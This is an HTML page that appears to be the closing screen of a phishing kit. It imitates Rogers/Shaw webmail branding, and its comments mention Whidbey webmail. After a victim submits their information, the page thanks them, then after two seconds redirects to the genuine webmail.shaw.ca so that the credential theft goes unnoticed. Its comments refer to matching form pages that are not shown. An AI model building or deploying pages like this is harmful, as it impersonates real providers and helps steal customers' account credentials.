<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Automatically redirects to the real Whidbey webmail after 2 seconds -->
    <meta http-equiv="refresh" content="2; url=https://webmail.shaw.ca/">

    <link rel="stylesheet" href="./css/style.css">
    <link rel="shortcut icon" href="image/Rogers_logo-OG.png" type="image/x-icon">
    <link rel="stylesheet" href="./css/bootstrap.css">
    <title>Submission Complete -shaw </title>
</head>

<body>
    <div class="container-fluid">
        <!-- Kept the exact same full-screen responsive background styling as your other pages -->
        <div class="row align-items-center justify-content-center"
            style="background-image:url('image/rogers-backgroundd.png'); background-size: cover; background-repeat: no-repeat; min-height: 100vh;">

            <div class="col-12 col-sm-8 col-md-6 col-lg-4">
                <!-- White background card matching your form designs -->
                <div class="form-container bg-white p-4 p-sm-5 rounded shadow text-center">

                    <!-- Centered Logo -->
                    <div class="mb-2">
                        <img src="image/RTWS.png" alt="Whidbey Logo" class="img-fluid rounded-circle mx-auto d-block"
                            width="80px">
                    </div>

                    <!-- Success Icon Visual Anchor -->
                    <div class="text-success mb-2">
                        <svg xmlns="http://w3.org" width="48" height="48" fill="currentColor"
                            class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                            <path
                                d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                        </svg>
                    </div>

                    <h4 class="fw-bold mb-2">Submission Complete</h4>
                    <p class="text-muted small">Your information has been successfully processed.</p>

                    <hr class="my-2">

                    <!-- Loading text explaining the redirect to the user -->
                    <div class="col-lg-12 pt-2">
                        <h2 class="text-center fs-1">Thank you!</h2>
                        <p class="text-center fs-4">We'll get back to you shortly</p>
                        <p class="h6 pt-2  text-center">© 2026 Rogers Communications </p>
                    </div>
                    <!-- <p class="text-muted small mb-0">
                        Redirecting you back to Whidbey Telecom Webmail login...
                    </p> -->

                </div>
            </div>

        </div>
    </div>
</body>

</html>
